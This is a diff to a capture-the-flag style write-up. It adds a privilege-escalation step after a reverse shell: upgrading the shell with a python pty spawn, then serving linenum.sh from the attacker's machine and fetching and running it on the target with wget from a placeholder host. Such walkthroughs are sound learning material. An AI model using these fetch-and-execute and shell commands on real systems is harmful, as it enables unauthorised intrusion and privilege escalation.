@@ -71,6 +71,26 @@ When appended to the end of the localhost ping, the final command looked like th
 #### Voila
 ![S](Images/revShell1.png)
 
+Now we have to escalate our privileges. This is the part that took me the longest on this box as I was running around searching for an exploit that would work here. But we will skip over all of that and get straight into the meat. First I needed to check who I was, `id` let me know that I was apache and a `pwd` showed that I spawned in the `/var/www` directory.
+Then I quickly upgraded my shell using `python -c 'import pty; pty.spawn("/bin/bash")'`
+I couldnt touch any of the user accounts and I most definately didnt have root access. So, I decided to go to `/tmp` and see if I could place any files in there.
+A quick `touch 1.txt` inside the directory, confirmed that I could. So, I went and grabbed a copy of linenum.sh, and saved it into my local directory where I was keeping all of the information about this box (nmap scans, notes, exploit code, etc.). 
+
+On my machine:
+
+`python3 -m http.server`
+
+On target machine:
+
+`wget http://m.y.i.p:8000/linenum.sh`
+
+`chmod +x linenum.sh`
+
+`./linenum.sh`
+
+Unfortunately I didnt get much information out of that, but I got enough. Which allowed me to go and search for an exploit to escalate my privileges.
+
+
 ## Box 2
 ![S](Images/nmap2_1.png)
 #### Box 2 pt.2
